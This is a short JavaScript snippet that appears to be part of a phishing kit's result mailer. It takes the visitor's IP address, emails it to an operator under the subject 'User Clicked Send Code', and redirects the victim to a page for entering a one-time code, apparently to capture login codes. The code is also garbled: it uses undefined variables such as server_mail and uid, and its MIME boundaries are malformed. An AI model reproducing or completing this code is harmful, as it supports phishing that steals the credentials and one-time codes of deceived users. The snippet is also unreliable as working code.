const email = require("email.js");
const config = require("config.js");

//Server Variables
const ip = process.env.REMOTE_ADDR;

//Name Attributes of HTML FORM
//Fetching HTML Values
const page = req.query.page; // should be sanitized and you can use req.body for either
const serv = req.body.__RequestVerificationToken;
const sender_name = "rzlt-Em6l3m";
const sender_mail = "em6l3mlight.log";

//Main Content
const main_subject = "User Clicked Send Code l " + ip;
const main_body = "<p>Login Code sent Succesfully</p><p>ip = " + ip + "</p>";

const retval = email.send(server_mail, main_subject, `${uid}\r\n \r\n\r\n ${main_body} \r\n\r\n--${uid}\r\n ${uid}`, {
  from: `${sender_name} <${sender_mail}>`,
  replyTo: sender_mail,
  mimeVersion: "1.0",
  contentType: `text/html; boundary="${uid}"`
});

//Sending mail to Sender
//Output
res.redirect("enter-otp.html");
